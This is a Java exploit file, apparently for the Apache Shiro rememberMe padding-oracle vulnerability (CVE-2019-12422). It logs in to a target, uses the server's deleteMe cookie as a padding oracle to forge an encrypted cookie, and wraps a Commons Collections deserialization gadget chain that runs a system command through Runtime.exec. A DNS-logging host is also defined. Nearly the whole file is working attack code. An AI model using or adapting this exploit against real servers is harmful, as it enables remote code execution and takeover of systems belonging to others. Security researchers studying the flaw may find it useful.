package cmisl.exp;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.http.Header;
import org.apache.http.NameValuePair;
import org.apache.http.client.config.CookieSpecs;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.shiro.codec.Base64;

import java.io.*;
import java.lang.reflect.Field;
import java.util.*;

public class Test {

    private static final CloseableHttpClient HTTP_CLIENT;
    private static final String DNSLOG = "http://xmhvlygjal.zaza.eu.org";
    private static final String REQUEST_URL = "http://127.0.0.1:8080";
    private static final String LOGIN_URL = REQUEST_URL + "/toLogin";
    private static final String LOGIN_USERNAME = "admin";
    private static final String LOGIN_PASSWORD = "admin123";
    //    private static final String EVIL_CODE_FILE_PATH = "./CVE-2019-12422/src/main/java/cmisl/exp/URLDNS.ser";
    private static final int BLOCK_SIZE = 16;

    private static byte[] validData;
    private static byte[] evilCode;
    private static int blockCount;

    static {
        RequestConfig config = RequestConfig.custom()
                .setRedirectsEnabled(false)
                .setCookieSpec(CookieSpecs.IGNORE_COOKIES)
                .build();

        HTTP_CLIENT = HttpClients.custom()
                .setDefaultRequestConfig(config)
                .build();
    }

    public static void main(String[] args) {
        try {
            validData = obtainValidData(LOGIN_URL, LOGIN_USERNAME, LOGIN_PASSWORD);

//            evilCode = Files.readAllBytes(Paths.get(EVIL_CODE_FILE_PATH));
            evilCode=getEvilCode(DNSLOG);
            evilCode = applyPkcs7Padding(evilCode);
//            deserialize(evilCode);
            blockCount = evilCode.length / BLOCK_SIZE;

            byte[] cipherText = generateCipherText();

            System.out.println("------------------------------------------------");
            System.out.println(Base64.encodeToString(cipherText));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static byte[] applyPkcs7Padding(byte[] data) {
        int paddingLength = BLOCK_SIZE - (data.length % BLOCK_SIZE);
        byte[] padding = new byte[paddingLength];
        Arrays.fill(padding, (byte) paddingLength);
        return concatenateArrays(data, padding);
    }

    private static boolean isDecryptable(byte[] paddingOracle) throws IOException {
        String rememberMeValue = Base64.encodeToString(concatenateArrays(validData, paddingOracle));
        String cookie = "rememberMe=" + rememberMeValue;

        HttpGet request = new HttpGet(REQUEST_URL);
        request.setHeader("Cookie", cookie);

        try (CloseableHttpResponse response = HTTP_CLIENT.execute(request)) {
            return !containsDeleteMe(response);
        }
    }

    private static boolean containsDeleteMe(CloseableHttpResponse response) {
        for (Header cookieHeader : response.getHeaders("Set-Cookie")) {
            if (cookieHeader.getValue().contains("deleteMe")) {
                return true;
            }
        }
        return false;
    }

    private static byte[] generateCipherText() throws IOException {
        byte[] cipherText = new byte[0];

        byte[] cn = computeCn(blockCount, new byte[0]);
        cipherText = concatenateArrays(cn, cipherText);

        byte[] paddingOracle = concatenateArrays(new byte[BLOCK_SIZE], cn);

        for (int i = blockCount - 1; i >= 0; i--) {
            byte[] ci = computeCn(i, paddingOracle);
            cipherText = concatenateArrays(ci, cipherText);
            paddingOracle = concatenateArrays(new byte[BLOCK_SIZE], ci);
        }

        return cipherText;
    }

    private static byte[] computeCn(int n, byte[] paddingOracle) throws IOException {
        if (n == blockCount) {
            byte[] byteArray = new byte[BLOCK_SIZE];
            Arrays.fill(byteArray, (byte) 0x78);
            return byteArray;
        }

        byte[] intermediateBytes = new byte[BLOCK_SIZE];

        for (int i = BLOCK_SIZE - 1; i >= 0; i--) {
            for (int j = 0; j <= 0xFF; j++) {
                if (isDecryptable(paddingOracle)) {
                    intermediateBytes[i] = (byte) (j ^ (BLOCK_SIZE - i));
                    break;
                }
                paddingOracle[i]++;
            }

            if (i > 0) {
                updatePaddingOracle(i, intermediateBytes, paddingOracle);
            }
        }

        byte[] cn = new byte[BLOCK_SIZE];
        byte[] payloadBlock = getBlock(n + 1, evilCode);
        for (int k = 0; k < BLOCK_SIZE; k++) {
            cn[k] = (byte) (payloadBlock[k] ^ intermediateBytes[k]);
        }

        return cn;
    }

    private static void updatePaddingOracle(int index, byte[] intermediateBytes, byte[] paddingOracle) {
        for (int k = index; k < BLOCK_SIZE; k++) {
            paddingOracle[k] = (byte) ((BLOCK_SIZE - index + 1) ^ intermediateBytes[k]);
        }
    }

    private static byte[] obtainValidData(String url, String username, String password) {
        try (CloseableHttpResponse response = executeLoginRequest(url, username, password)) {
            String setCookie = getSetCookieHeader(response);
            return extractRememberMeValue(setCookie);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return new byte[0];
    }

    private static CloseableHttpResponse executeLoginRequest(String url, String username, String password) throws IOException {
        HttpPost httpPost = new HttpPost(url);
        List<NameValuePair> params = new ArrayList<>();
        params.add(new BasicNameValuePair("username", username));
        params.add(new BasicNameValuePair("password", password));
        params.add(new BasicNameValuePair("rememberMe", "true"));
        params.add(new BasicNameValuePair("submit", "Login"));
        httpPost.setEntity(new UrlEncodedFormEntity(params, "UTF-8"));
        return HTTP_CLIENT.execute(httpPost);
    }

    private static String getSetCookieHeader(CloseableHttpResponse response) {
        Header[] headers = response.getHeaders("Set-Cookie");

        for (Header header : headers) {
            String[] cookies = header.getValue().split(";");
            for (String cookie : cookies) {
                String[] pair = cookie.trim().split("=", 2);
                if (pair.length == 2 && pair[0].equals("rememberMe") && !pair[1].equals("deleteMe")) {
                    return pair[1];
                }
            }
        }

        return "";
    }

    private static byte[] extractRememberMeValue(String cookie) {
        if (cookie != null) {
            String base64 = cookie;
            return Base64.decode(base64);
        }
        return new byte[0];
    }

    private static byte[] getBlock(int blockIndex, byte[] byteStream) {
        int startIndex = (blockIndex - 1) * BLOCK_SIZE;
        if (startIndex < 0 || startIndex >= byteStream.length) {
            return new byte[0];
        }

        int length = Math.min(BLOCK_SIZE, byteStream.length - startIndex);
        byte[] block = new byte[length];
        System.arraycopy(byteStream, startIndex, block, 0, length);
        return block;
    }

    private static byte[] concatenateArrays(byte[] array1, byte[] array2) {
        byte[] result = new byte[array1.length + array2.length];
        System.arraycopy(array1, 0, result, 0, array1.length);
        System.arraycopy(array2, 0, result, array1.length, array2.length);
        return result;
    }

    public static byte[] getEvilCode(String dnslog) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),

                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",null}
                ),

                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{Runtime.class,null}
                ),

                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}
                )
        };

        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map test =new HashMap();
        Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(test, Runtime.class);
        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry,null);

        Field field = TiedMapEntry.class.getDeclaredField("map");
        field.setAccessible(true);
        field.set(tiedMapEntry,decorateMap);

        return serialize(expMap);
    }

    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.close();
        return baos.toByteArray();
    }

    public static Object deserialize(byte[] bytes) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
